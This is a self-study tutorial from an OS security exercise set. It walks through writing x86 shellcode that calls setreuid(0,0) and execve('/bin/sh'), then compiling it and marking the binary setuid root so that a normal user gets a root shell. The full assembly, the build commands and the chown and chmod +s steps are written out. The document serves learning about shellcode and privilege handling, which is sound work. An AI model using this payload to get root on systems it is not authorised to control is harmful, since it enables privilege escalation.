# Shell-Spawning Code (Version. 1)

* (SPOILER) Reference: [0x2a4 Shell-Spawning Code](https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2a0-writing_shellcode.html)

## TODO
1. Before you start, ensure that you are a non-root user!
2. Write a shellcode that spawns normal user shell on **x86**. Add some codes so that it can also spawn a root shell, when you are running a `setuid` root program with the root privileges! Compile the code.
3. Execute the program, and check if the program spawns a normal user shell correctly.
4. Switch your account to root, and do the Step 3 again. If it spawns a root shell successfully, come back to the non-root user account and go to the next!
5. With being granted root privileges temporarily, change the owner of the program as root.
6. With being granted root privileges temporarily, set the `setuid` and `setgid` bit.
7. Execute the program as a non-root user again, and check the user of the spawned shell with a command. Are you root or not?

### Constraints
1. Declare just one variable; define a string something like `fpath = "(PATH)XXXXAAAABBBBCCCC"`. You can adjust the masking alphabet part. (Example: /my/path/helloXABBCCCCD)
2. Use `fpath` for ALL arguments that load an address.

## Hints
<details>
  <summary><b>SPOILERS</b></summary>

### Hint 1: System Calls
    // NR = 70
    int setreuid(uid_t ruid, uid_t euid);

    // NR = 11
    int execve(const char *pathname, char *const _Nullable argv[],
                  char *const _Nullable envp[]);

### Hint 2: Section
1. `.data`: The data section

    a. String "/bin/shXXXX" (Note: Just an example for the hint! Might not be the final.)
   
2. `.text`: The code section

    a. `.global`: `_start` (The entry point of the program)
  
    b. `_start`

    * int setreuid(uid_t *ruid*, uid_t *euid*);
    * int execve(const char **pathname*, char **const* _Nullable *argv[]*, char *const _Nullable *envp[]*);

### Hint 3: Execution

1. (TODO 1~3) Compile & Execute as Normal User

   a. `gcc`: GNU Compiler. Need to generate code for IA-32 architecture.

   b. `ld`: GNU Linker. Need to output 32-bit code.

   c. Execute the output.

2. (TODO 4) Switch to Root, and Do Step 1 Again

   a. `su`: A command to switch account to root.

   b. `cd`: A command to change directory.

3. (TODO 5) Change the Owner of the Program with Root Privilege Temporarily

   a. `sudo`: A command to temporarily being granted root privilege.

   b. `chown`: A command to change the owner of the program.
   
5. (TODO 6) Set the `setuid` bit to the Program with Root Privilege Temporarily

   a. `sudo`: A command to temporarily being granted root privilege.

   b. `chmod`: A command to set the `setuid` bit.

</details>

## Solution
<details>
  <summary><b>SPOILERS</b></summary>

The result from the Step 1~3:

![whoami reruo](https://github.com/reruo321/OS-Self-Study/assets/48712088/4699d157-bdec-4ba3-b21c-ff07d275736f)

The result from the Step 4:

![noset whoami root](https://github.com/reruo321/OS-Self-Study/assets/48712088/b8b40138-54f7-4a32-b932-4e170c7592f8)

The result from the Step 5~7:

![whoami root](https://github.com/reruo321/OS-Self-Study/assets/48712088/f7dc3451-9e8c-486e-9789-7e93d3ceade1)

### Assembly
(Step 1, 2)

    .data
    filepath:
            .string "/bin/shXAAAABBBB"
    .text
    .global _start
    _start:

    # int setreuid(uid_t ruid, uid_t euid);
    # setreuid(0, 0);
    
            # %eax: Linux system call number (setreuid = 70)
            movl $70, %eax

            # %ebx: arg0, real UID (UID of root = 0)
            movl $0, %ebx

            # %ecx: arg1, effective UID (UID of root = 0)
            movl $0, %ecx

            # Linux system call (= interrupt 0x80)
            int $0x80

    # int execve(const char *pathname, char *const _Nullable argv[],
    #             char *const _Nullable envp[]);
    # execve("/bin/sh", ["/bin/sh"], NULL);
    # See more explanation below
            
            movl $0, %eax
            movl $filepath, %ebx
            movb %al, 7(%ebx)
            movl %ebx, 8(%ebx)
            movl %eax, 12(%ebx)
    
            movl $11, %eax
            leal 8(%ebx), %ecx
            leal 12(%ebx), %edx
          
            int $0x80

#### `setreuid`
Linux manual page: [setreuid](https://man7.org/linux/man-pages/man2/setreuid.2.html)

`setuid` root programs usually drop root privileges for the security purposes. Therefore, even if a shellcode has the `setuid` bit, if it runs only `execve`, it will always spawn a normal user shell for the normal user.

This is why we need to use `setreuid` in the project. Even if the program drops root privileges when it starts to run,

    setreuid(0, 0);

This will set both of the RUID and EUID to root's UID (= 0), so `execve` next to it can spawn a root shell.

#### `evecve`
Linux manual page: [execve](https://man7.org/linux/man-pages/man2/execve.2.html)

`execve` executes the program referred to by pathname.

![execve](https://github.com/reruo321/OS-Self-Study/assets/48712088/0f3ebb37-f8eb-42d5-bb04-64955a50aa4b)

* (Blue) `/bin/sh` is an executable file and a symbolic link to `bash`, which is the default shell in most Linux distributions.

* (Red) In addition to "/bin/sh", you should add a NULL character, '\0', to identify the end of the string. It's the 7th character.

Note that the parameters *argv* and *envp* should get the type as 'const char *'!

* (Green) To refer the address again on the parameter *argv*, put it on the 8~11th characters.

* (Purple) Set the null pointer to terminate two parameter arrays, *argv* and *envp*. It can be expressed as 0x0000. Put it on the 12~15th characters so that it can be used for both *argv* (\[filepath, NULL\]) and *envp*. (\[NULL\])

#### Programming `execve`

One of the methods to define the variable `filepath` is "/bin/shXAAAABBBB".

Move 0 to `eax` by doing

    movl $0, %eax

And move other contents around `ebx` with the register indirect addressing modes.

    movl $filepath, %ebx
    movb %al, 7(%ebx)
    movl %ebx, 8(%ebx)
    movl %eax, 12(%ebx)

After moving 0s from `eax`, move 11 to it to execute `execve`, the system call #11. Also set `ecx` and `edx` as its arguments.

    movl $11, %eax
    leal 8(%ebx), %ecx
    leal 12(%ebx), %edx

### Compiling
Let's compile the project code, "spawn1.s".

(In i386)

    $ gcc spawn1.s -c && ld spawn1.o -o spawn1

(In x86-64)

    $ gcc spawn1.s -c -m32 && ld spawn1.o -o spawn1 -melf_i386

### Checking the User
(Step 3, 4, 7) Run a shell and use `whoami` or `id -un` to find the username of the current effective UID.

![whoami reruo](https://github.com/reruo321/OS-Self-Study/assets/48712088/64cd14ee-e7f6-4ec7-a106-ee32ccc00720)

![whoami root](https://github.com/reruo321/OS-Self-Study/assets/48712088/ef0e6234-07f0-4227-8a2d-1bf105992a15)

You can also check the type of the shell you are running right away with the "prompt indicator". `$` indicates that it is a normal user shell. On the other hand, `#` indicates that it is a root shell, whose EUID is 0.

### Switching the User Account
(Step 4) On the terminal, switch your user account with the `su` command.

If you want to switch to root,

    $ su -

If you want to switch back to a normal user "reruo",

    $ su reruo

### File Permissions
#### `chown`
(Step 5) On the terminal, use the `chown` command with `sudo` for the temporary root privileges. It changes the owner of the program to root.

    $ sudo chown root spawn1

#### `chmod`
(Step 6) On the terminal, use the `chmod` command with `sudo` for the temporary root privileges. `chmod +s` sets both `setuid` bit and `setgid` bit ON.

    $ sudo chmod +s spawn1

</details>
